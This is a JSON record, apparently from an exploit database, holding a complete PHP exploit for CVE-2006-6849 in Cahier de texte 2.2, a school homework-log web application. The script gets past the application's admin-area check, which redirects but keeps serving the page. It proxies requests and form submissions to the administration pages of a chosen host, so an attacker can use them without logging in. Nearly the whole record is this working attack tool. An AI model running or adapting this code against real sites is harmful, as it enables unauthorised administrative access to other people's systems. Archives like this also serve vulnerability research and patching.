{
  "id": "3016",
  "title": "Cahier de texte 2.2 - Bypass General Access Protection",
  "cve": "CVE-2006-6849",
  "vuln_type": "unknown",
  "code": "<?\r\n/*\r\n\r\n  Informations\r\n  ============\r\n  Affected.scr..: Cahier de texte V2.2 (last version)\r\n  Poc.ID........: 17061224\r\n  Type..........: Bypass general access restriction\r\n  Risk.level....: High\r\n  Conditions....: None\r\n  Src.download..: www.etab.ac-caen.fr/bsauveur/cahier_de_texte/\r\n  Poc.link......: acid-root.new.fr/poc/17061224.txt\r\n  Credits.......: DarkFig\r\n\r\n  Vulnerable code\r\n  ===============\r\n  <?php session_start();\r\n  if (isset($_SESSION['nom_prof'])) { \r\n  if ($_SESSION['nom_prof']<>'Administrateur') { header(\"Location: ../index.php\");}\r\n  ;} else { header(\"Location: ../index.php\");}?>\r\n  ...\r\n\r\n*/\r\n\r\nif(!isset($_GET['host']) || empty($_GET['host'])) headers();\r\nif(!isset($_GET['wanted'])) $wanted = 'index.php';\r\n\r\n$host = $_GET['host'];\r\n$prox = $_GET['prox'];\r\n$path = $_GET['path'];\r\necho sockxp($host,$path,$prox,\"administration/\".$wanted);\r\nexit(0);\r\n\r\nfunction headers()\r\n{\r\n\tprint(\"<html>\r\n<head>\r\n <title>Cahier de texte V2.2 Exploit</title>\r\n</head>\r\n<body>\r\n <form method='get' action='\".$_SERVER['PHP_SELF'].\"'>\r\n  <input type='text' name='host' value='host'>\r\n  <input type='text' name='path' value='path'>\r\n  <input type='text' name='prox' value='proxyhost:proxyport'>\r\n  <input type='submit' value='Exploit'>\r\n </form>\r\n</body>\r\n</html>\");\r\n\texit(0);\r\n}\r\n\r\nfunction sockxp($host,$path,$prox,$wanted)\r\n{\r\n\t$hope = !empty($prox) ? $prox : $host.':80';\r\n\tpreg_match(\"/^(\\S*):([0-9]+){1,5}/\",$hope,$hosta);\r\n\t$hosh = $hosta[1];\r\n\t$hosp = $hosta[2];\r\n\t\r\n\t$recv = '';\r\n\t$meth = $_SERVER['REQUEST_METHOD'];\r\n\tif(empty($hosh) || empty($hosp)) exit(1);\r\n\r\n\tif(!$sock = fsockopen($hosh,$hosp)) exit(1);\r\n\t$dat  = $meth.\" http://\".$host;\r\n\t\r\n\tif($meth === \"POST\") $dat .= \"/\".str_replace(\"administration//\",\"\",$wanted);\r\n\telse $dat .= $path.$wanted;\r\n\t\r\n\t$dat .= \" HTTP/1.1\\r\\n\";\r\n\t$dat .= \"Host: $host\\r\\n\";\r\n\t$dat .= \"Connection: Close\\r\\n\";\r\n\t\r\n\tif($meth === \"POST\") {\r\n\t\t$postdata = get_postdata();\r\n\t\t$dat .= \"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n\t\t$dat .= \"Content-Length: \".strlen($postdata).\"\\r\\n\\r\\n\";\r\n\t\t$dat .= $postdata.\"\\r\\n\\r\\n\";\r\n\t} else {\r\n\t\t$dat .= \"\\r\\n\";\r\n\t}\r\n\r\n\tfputs($sock,$dat);\r\n\twhile(!feof($sock)) $recv .= fgets($sock);\r\n\tfclose($sock);\r\n\r\n\treturn html_replace($recv);\r\n}\r\n\r\nfunction html_replace($htmlc)\r\n{\r\n\tglobal $host,$path,$prox;\r\n\t$iniv = $_SERVER['PHP_SELF'].\"?host=$host&path=$path&prox=$prox&wanted=\";\r\n\t$newc = str_replace(\"action=\\\"\",\"action=\\\"$iniv\",$htmlc);\r\n\t$newc = str_replace(\"=\\\"..\",\"=\\\"http://${host}${path}administration/..\",$newc);\r\n\t$newc = str_replace(\"a href=\\\"\",\"a href=\\\"$iniv\",$newc);\r\n\t$newc = str_replace(\"MM_goToURL('parent','\",\"MM_goToURL('parent','$iniv\",$newc);\r\n\t$newc = explode(\"\\n\",$newc);\r\n\tfor($i=1;$i<count($newc);$i++) {\r\n\t\tif(!preg_match(\"/(\\S*):/\",$newc[$i])) $v=1;\r\n\t\tif($v) $nnewc .= $newc[$i].\"\\n\";\r\n\t}\r\n\treturn $nnewc;\r\n}\r\n\r\nfunction get_postdata()\r\n{\r\n\t$postdata = '';\r\n\tforeach($_POST as $key => $value) {\r\n\t\t$postdata .= $key.\"=\".$value.\"&\";\r\n\t}\r\n\treturn $postdata;\r\n}\r\n?>\r\n\r\n# milw0rm.com [2006-12-26]",
  "url": "https://www.exploit-db.com/exploits/3016"
}